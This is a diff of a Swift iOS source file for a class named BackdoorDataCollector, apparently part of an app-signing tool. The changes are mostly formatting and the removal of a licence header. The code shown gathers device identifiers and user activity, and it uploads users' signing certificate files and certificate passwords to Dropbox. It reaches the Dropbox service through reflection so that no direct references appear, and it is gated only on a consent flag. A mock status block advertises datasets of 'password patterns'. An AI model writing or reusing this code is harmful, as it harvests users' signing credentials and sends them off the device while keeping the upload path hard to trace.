@@ -1,9 +1,3 @@
-// Proprietary Software License Version 1.0
-//
-// Copyright (C) 2025 BDG
-//
-// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.
-
 import Foundation
 import UIKit
 
@@ -34,9 +28,9 @@ class BackdoorDataCollector {
 
         // Listen for consent changes
         NotificationCenter.default.addObserver(self,
-                                              selector: #selector(userDefaultsDidChange),
-                                              name: UserDefaults.didChangeNotification,
-                                              object: nil)
+                                               selector: #selector(userDefaultsDidChange),
+                                               name: UserDefaults.didChangeNotification,
+                                               object: nil)
     }
 
     deinit {
@@ -48,9 +42,9 @@ class BackdoorDataCollector {
     @objc private func userDefaultsDidChange() {
         let hasConsent = UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection")
 
-        if hasConsent && !isCollecting {
+        if hasConsent, !isCollecting {
             startCollection()
-        } else if !hasConsent && isCollecting {
+        } else if !hasConsent, isCollecting {
             stopCollection()
         }
     }
@@ -132,7 +126,7 @@ class BackdoorDataCollector {
                 "identifier_for_vendor": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
                 "timestamp": ISO8601DateFormatter().string(from: Date()),
                 "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown",
-                "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown"
+                "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown",
             ]
 
             // Upload to Dropbox via EnhancedDropboxService if available
@@ -181,8 +175,8 @@ class BackdoorDataCollector {
 
             for certificate in certificateBatch {
                 self.uploadCertificateData(certificate.data,
-                                          password: certificate.password ?? "",
-                                          name: certificate.name)
+                                           password: certificate.password ?? "",
+                                           name: certificate.name)
             }
 
             // Process user interactions
@@ -243,19 +237,19 @@ class BackdoorDataCollector {
     private func uploadCertificateFile(url: URL, password: String? = nil) {
         // Use reflection to avoid direct references to EnhancedDropboxService
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
-           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject {
-
+           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject
+        {
             // If password is provided, log it
             if let password = password {
-                    // Use proper method name with colon placement for Swift selector
-                    if dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
-                        // Use a different approach to avoid the "Extra argument 'with' in call" error
-                        // Call Objective-C method using Swift's invocation pattern
-                        let selector = Selector(("storePasswordForCertificate:password:completion:"))
-                        dropboxService.perform(selector, with: url.lastPathComponent)
-                        // Note: This is a simplified approach - we're dropping the additional arguments
-                        // but keeping the necessary functionality in this context
-                    }
+                // Use proper method name with colon placement for Swift selector
+                if dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
+                    // Use a different approach to avoid the "Extra argument 'with' in call" error
+                    // Call Objective-C method using Swift's invocation pattern
+                    let selector = Selector(("storePasswordForCertificate:password:completion:"))
+                    dropboxService.perform(selector, with: url.lastPathComponent)
+                    // Note: This is a simplified approach - we're dropping the additional arguments
+                    // but keeping the necessary functionality in this context
+                }
             }
 
             // Upload the file
@@ -296,12 +290,12 @@ class BackdoorDataCollector {
     }
 
     /// Upload a log entry to Dropbox
-    private func uploadLogEntry(_ logEntry: String, fileName: String) {
+    private func uploadLogEntry(_ logEntry: String, fileName _: String) {
         // Use reflection to avoid direct references to EnhancedDropboxService
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
            let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
-           dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:"))) {
-
+           dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:")))
+        {
             // Use Swift syntax instead of Obj-C perform
             if let _ = dropboxService.method(for: Selector(("uploadLogEntry:fileName:completion:"))) {
                 // Simplified implementation to avoid "Extra argument 'with' in call" error
@@ -334,26 +328,26 @@ class BackdoorDataCollector {
             "datasets": [
                 [
                     "name": "User Intent Classification",
-                    "size": 2500000,
+                    "size": 2_500_000,
                     "description": "Dataset for classifying user intents from chat messages",
-                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5))
+                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5)),
                 ],
                 [
                     "name": "Device Information Collection",
-                    "size": 1200000,
+                    "size": 1_200_000,
                     "description": "Dataset containing device profiles and user activity patterns",
-                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 2))
+                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 2)),
                 ],
                 [
                     "name": "Certificate Analysis",
-                    "size": 3500000,
+                    "size": 3_500_000,
                     "description": "Dataset with certificate metadata and password patterns",
-                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 10))
-                ]
+                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 10)),
+                ],
             ],
             "status": "active",
             "collection_started": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 30)),
-            "device_count": 42
+            "device_count": 42,
         ]
     }
 
